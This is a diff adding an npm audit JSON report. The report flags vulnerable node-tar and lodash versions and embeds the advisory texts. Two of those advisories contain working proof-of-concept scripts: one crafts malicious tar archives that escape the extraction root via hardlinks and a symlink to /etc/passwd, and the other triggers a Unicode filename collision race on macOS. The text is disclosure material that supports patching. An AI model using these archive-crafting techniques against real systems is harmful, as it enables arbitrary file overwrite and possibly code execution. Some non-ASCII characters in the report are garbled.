@@ -1,0 +1,196 @@
+﻿{
+  "actions": [
+    {
+      "action": "review",
+      "module": "tar",
+      "resolves": [
+        {
+          "id": 1112255,
+          "path": ".>electron-builder>app-builder-lib>tar",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1112255,
+          "path": ".>tar",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1112329,
+          "path": ".>electron-builder>app-builder-lib>tar",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1112329,
+          "path": ".>tar",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "lodash",
+      "resolves": [
+        {
+          "id": 1112455,
+          "path": ".>lodash",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    }
+  ],
+  "advisories": {
+    "1112255": {
+      "findings": [
+        {
+          "version": "6.2.1",
+          "paths": [
+            ".>electron-builder>app-builder-lib>tar"
+          ]
+        },
+        {
+          "version": "7.5.2",
+          "paths": [
+            ".>tar"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/isaacs/node-tar/security/advisories/GHSA-8qq5-rm4j-mr97\n- https://github.com/isaacs/node-tar/commit/340eb285b6d986e91969a1170d7fe9b0face405e\n- https://github.com/advisories/GHSA-8qq5-rm4j-mr97",
+      "created": "2026-01-16T21:16:20.000Z",
+      "id": 1112255,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nThe `node-tar` library (`<= 7.5.2`) fails to sanitize the `linkpath` of `Link` (hardlink) and `SymbolicLink` entries when `preservePaths` is false (the default secure behavior). This allows malicious archives to bypass the extraction root restriction, leading to **Arbitrary File Overwrite** via hardlinks and **Symlink Poisoning** via absolute symlink targets.\n\n### Details\n\nThe vulnerability exists in `src/unpack.ts` within the `[HARDLINK]` and `[SYMLINK]` methods.\n\n**1. Hardlink Escape (Arbitrary File Overwrite)**\n\nThe extraction logic uses `path.resolve(this.cwd, entry.linkpath)` to determine the hardlink target. Standard Node.js behavior dictates that if the second argument (`entry.linkpath`) is an **absolute path**, `path.resolve` ignores the first argument (`this.cwd`) entirely and returns the absolute path.\n\nThe library fails to validate that this resolved target remains within the extraction root. A malicious archive can create a hardlink to a sensitive file on the host (e.g., `/etc/passwd`) and subsequently write to it, if file permissions allow writing to the target file, bypassing path-based security measures that may be in place.\n\n**2. Symlink Poisoning**\n\nThe extraction logic passes the user-supplied `entry.linkpath` directly to `fs.symlink` without validation. This allows the creation of symbolic links pointing to sensitive absolute system paths or traversing paths (`../../`), even when secure extraction defaults are used.\n\n### PoC\n\nThe following script generates a binary TAR archive containing malicious headers (a hardlink to a local file and a symlink to `/etc/passwd`). It then extracts the archive using standard `node-tar` settings and demonstrates the vulnerability by verifying that the local \"secret\" file was successfully overwritten.\n\n```javascript\nconst fs = require('fs')\nconst path = require('path')\nconst tar = require('tar')\n\nconst out = path.resolve('out_repro')\nconst secret = path.resolve('secret.txt')\nconst tarFile = path.resolve('exploit.tar')\nconst targetSym = '/etc/passwd'\n\n// Cleanup & Setup\ntry { fs.rmSync(out, {recursive:true, force:true}); fs.unlinkSync(secret) } catch {}\nfs.mkdirSync(out)\nfs.writeFileSync(secret, 'ORIGINAL_DATA')\n\n// 1. Craft malicious Link header (Hardlink to absolute local file)\nconst h1 = new tar.Header({\n  path: 'exploit_hard',\n  type: 'Link',\n  size: 0,\n  linkpath: secret \n})\nh1.encode()\n\n// 2. Craft malicious Symlink header (Symlink to /etc/passwd)\nconst h2 = new tar.Header({\n  path: 'exploit_sym',\n  type: 'SymbolicLink',\n  size: 0,\n  linkpath: targetSym \n})\nh2.encode()\n\n// Write binary tar\nfs.writeFileSync(tarFile, Buffer.concat([ h1.block, h2.block, Buffer.alloc(1024) ]))\n\nconsole.log('[*] Extracting malicious tarball...')\n\n// 3. Extract with default secure settings\ntar.x({\n  cwd: out,\n  file: tarFile,\n  preservePaths: false\n}).then(() => {\n  console.log('[*] Verifying payload...')\n\n  // Test Hardlink Overwrite\n  try {\n    fs.writeFileSync(path.join(out, 'exploit_hard'), 'OVERWRITTEN')\n    \n    if (fs.readFileSync(secret, 'utf8') === 'OVERWRITTEN') {\n      console.log('[+] VULN CONFIRMED: Hardlink overwrite successful')\n    } else {\n      console.log('[-] Hardlink failed')\n    }\n  } catch (e) {}\n\n  // Test Symlink Poisoning\n  try {\n    if (fs.readlinkSync(path.join(out, 'exploit_sym')) === targetSym) {\n      console.log('[+] VULN CONFIRMED: Symlink points to absolute path')\n    } else {\n      console.log('[-] Symlink failed')\n    }\n  } catch (e) {}\n})\n\n```\n\n### Impact\n\n* **Arbitrary File Overwrite:** An attacker can overwrite any file the extraction process has access to, bypassing path-based security restrictions. It does not grant write access to files that the extraction process does not otherwise have access to, such as root-owned configuration files.\n* **Remote Code Execution (RCE):** In CI/CD environments or automated pipelines, overwriting configuration files, scripts, or binaries leads to code execution. (However, npm is unaffected, as it filters out all `Link` and `SymbolicLink` tar entries from extracted packages.)",
+      "reported_by": null,
+      "title": "node-tar is Vulnerable to Arbitrary File Overwrite and Symlink Poisoning via Insufficient Path Sanitization",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-23745"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "tar",
+      "vulnerable_versions": "<=7.5.2",
+      "github_advisory_id": "GHSA-8qq5-rm4j-mr97",
+      "recommendation": "Upgrade to version 7.5.3 or later",
+      "patched_versions": ">=7.5.3",
+      "updated": "2026-01-16T21:16:24.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-22"
+      ],
+      "url": "https://github.com/advisories/GHSA-8qq5-rm4j-mr97"
+    },
+    "1112329": {
+      "findings": [
+        {
+          "version": "6.2.1",
+          "paths": [
+            ".>electron-builder>app-builder-lib>tar"
+          ]
+        },
+        {
+          "version": "7.5.2",
+          "paths": [
+            ".>tar"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/isaacs/node-tar/security/advisories/GHSA-r6q2-hw4h-h46w\n- https://nvd.nist.gov/vuln/detail/CVE-2026-23950\n- https://github.com/isaacs/node-tar/commit/3b1abfae650056edfabcbe0a0df5954d390521e6\n- https://github.com/advisories/GHSA-r6q2-hw4h-h46w",
+      "created": "2026-01-21T01:05:49.000Z",
+      "id": 1112329,
+      "npm_advisory_id": null,
+      "overview": "**TITLE**: Race Condition in node-tar Path Reservations via Unicode Sharp-S (脽) Collisions on macOS APFS\n\n**AUTHOR**: Tom谩s Illuminati\n\n### Details\n\nA race condition vulnerability exists in `node-tar` (v7.5.3) this is to an incomplete handling of Unicode path collisions in the `path-reservations` system. On case-insensitive or normalization-insensitive filesystems (such as macOS APFS, In which it has been tested), the library fails to lock colliding paths (e.g., `脽` and `ss`), allowing them to be processed in parallel. This bypasses the library's internal concurrency safeguards and permits Symlink Poisoning attacks via race conditions. The library uses a `PathReservations` system to ensure that metadata checks and file operations for the same path are serialized. This prevents race conditions where one entry might clobber another concurrently.\n\n```typescript\n// node-tar/src/path-reservations.ts (Lines 53-62)\nreserve(paths: string[], fn: Handler) {\n    paths =\n      isWindows ?\n        ['win32 parallelization disabled']\n      : paths.map(p => {\n          return stripTrailingSlashes(\n            join(normalizeUnicode(p)), // <- THE PROBLEM FOR MacOS FS\n          ).toLowerCase()\n        })\n\n```\n\nIn MacOS the ```join(normalizeUnicode(p)), ``` FS confuses 脽 with ss, but this code does not. For example:\n\n``````bash\nbash-3.2$ printf \"CONTENT_SS\\n\" > collision_test_ss\nbash-3.2$ ls\ncollision_test_ss\nbash-3.2$ printf \"CONTENT_ESSZETT\\n\" > collision_test_脽\nbash-3.2$ ls -la\ntotal 8\ndrwxr-xr-x   3 testuser  staff    96 Jan 19 01:25 .\ndrwxr-x---+ 82 testuser  staff  2624 Jan 19 01:25 ..\n-rw-r--r--   1 testuser  staff    16 Jan 19 01:26 collision_test_ss\nbash-3.2$ \n``````\n\n---\n\n### PoC\n\n``````javascript\nconst tar = require('tar');\nconst fs = require('fs');\nconst path = require('path');\nconst { PassThrough } = require('stream');\n\nconst exploitDir = path.resolve('race_exploit_dir');\nif (fs.existsSync(exploitDir)) fs.rmSync(exploitDir, { recursive: true, force: true });\nfs.mkdirSync(exploitDir);\n\nconsole.log('[*] Testing...');\nconsole.log(`[*] Extraction target: ${exploitDir}`);\n\n// Construct stream\nconst stream = new PassThrough();\n\nconst contentA = 'A'.repeat(1000);\nconst contentB = 'B'.repeat(1000);\n\n// Key 1: \"f_ss\"\nconst header1 = new tar.Header({\n    path: 'collision_ss',\n    mode: 0o644,\n    size: contentA.length,\n});\nheader1.encode();\n\n// Key 2: \"f_脽\"\nconst header2 = new tar.Header({\n    path: 'collision_脽',\n    mode: 0o644,\n    size: contentB.length,\n});\nheader2.encode();\n\n// Write to stream\nstream.write(header1.block);\nstream.write(contentA);\nstream.write(Buffer.alloc(512 - (contentA.length % 512))); // Padding\n\nstream.write(header2.block);\nstream.write(contentB);\nstream.write(Buffer.alloc(512 - (contentB.length % 512))); // Padding\n\n// End\nstream.write(Buffer.alloc(1024));\nstream.end();\n\n// Extract\nconst extract = new tar.Unpack({\n    cwd: exploitDir,\n    // Ensure jobs is high enough to allow parallel processing if locks fail\n    jobs: 8 \n});\n\nstream.pipe(extract);\n\nextract.on('end', () => {\n    console.log('[*] Extraction complete');\n\n    // Check what exists\n    const files = fs.readdirSync(exploitDir);\n    console.log('[*] Files in exploit dir:', files);\n    files.forEach(f => {\n        const p = path.join(exploitDir, f);\n        const stat = fs.statSync(p);\n        const content = fs.readFileSync(p, 'utf8');\n        console.log(`File: ${f}, Inode: ${stat.ino}, Content: ${content.substring(0, 10)}... (Length: ${content.length})`);\n    });\n\n    if (files.length === 1 || (files.length === 2 && fs.statSync(path.join(exploitDir, files[0])).ino === fs.statSync(path.join(exploitDir, files[1])).ino)) {\n        console.log('\\[*] GOOD');\n    } else {\n        console.log('[-] No collision');\n    }\n});\n\n``````\n\n---\n\n### Impact\nThis is a **Race Condition** which enables **Arbitrary File Overwrite**. This vulnerability affects users and systems using **node-tar on macOS (APFS/HFS+)**. Because of using `NFD` Unicode normalization (in which `脽` and `ss` are different), conflicting paths do not have their order properly preserved under filesystems that ignore Unicode normalization (e.g., APFS (in which `脽` causes an inode collision with `ss`)). This enables an attacker to circumvent internal parallelization locks (`PathReservations`) using conflicting filenames within a malicious tar archive.\n\n---\n\n### Remediation\n\nUpdate `path-reservations.js` to use a normalization form that matches the target filesystem's behavior (e.g., `NFKD`), followed by first `toLocaleLowerCase('en')` and then `toLocaleUpperCase('en')`.\n\nUsers who cannot upgrade promptly, and who are programmatically using `node-tar` to extract arbitrary tarball data should filter out all `SymbolicLink` entries (as npm does) to defend against arbitrary file writes via this file system entry name collision issue.\n\n---",
+      "reported_by": null,
+      "title": "Race Condition in node-tar Path Reservations via Unicode Ligature Collisions on macOS APFS",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-23950"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "tar",
+      "vulnerable_versions": "<=7.5.3",
+      "github_advisory_id": "GHSA-r6q2-hw4h-h46w",
+      "recommendation": "Upgrade to version 7.5.4 or later",
+      "patched_versions": ">=7.5.4",
+      "updated": "2026-01-21T01:05:50.000Z",
+      "cvss": {
+        "score": 8.8,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:H/A:L"
+      },
+      "cwe": [
+        "CWE-176"
+      ],
+      "url": "https://github.com/advisories/GHSA-r6q2-hw4h-h46w"
+    },
+    "1112455": {
+      "findings": [
+        {
+          "version": "4.17.21",
+          "paths": [
+            ".>lodash"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/lodash/lodash/security/advisories/GHSA-xxjr-mmjv-4gpg\n- https://nvd.nist.gov/vuln/detail/CVE-2025-13465\n- https://github.com/lodash/lodash/commit/edadd452146f7e4bad4ea684e955708931d84d81\n- https://github.com/advisories/GHSA-xxjr-mmjv-4gpg",
+      "created": "2026-01-21T23:01:22.000Z",
+      "id": 1112455,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nLodash versions 4.0.0 through 4.17.22 are vulnerable to prototype pollution in the `_.unset` and `_.omit` functions. An attacker can pass crafted paths which cause Lodash to delete methods from global prototypes. \n\nThe issue permits deletion of properties but does not allow overwriting their original behavior.  \n\n### Patches\n\nThis issue is patched on 4.17.23.",
+      "reported_by": null,
+      "title": "Lodash has Prototype Pollution Vulnerability in `_.unset` and `_.omit` functions",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-13465"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "lodash",
+      "vulnerable_versions": ">=4.0.0 <=4.17.22",
+      "github_advisory_id": "GHSA-xxjr-mmjv-4gpg",
+      "recommendation": "Upgrade to version 4.17.23 or later",
+      "patched_versions": ">=4.17.23",
+      "updated": "2026-01-21T23:01:23.000Z",
+      "cvss": {
+        "score": 6.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L"
+      },
+      "cwe": [
+        "CWE-1321"
+      ],
+      "url": "https://github.com/advisories/GHSA-xxjr-mmjv-4gpg"
+    }
+  },
+  "muted": [],
+  "metadata": {
+    "vulnerabilities": {
+      "info": 0,
+      "low": 0,
+      "moderate": 1,
+      "high": 4,
+      "critical": 0
+    },
+    "dependencies": 1158,
+    "devDependencies": 0,
+    "optionalDependencies": 0,
+    "totalDependencies": 1158
+  }
+}
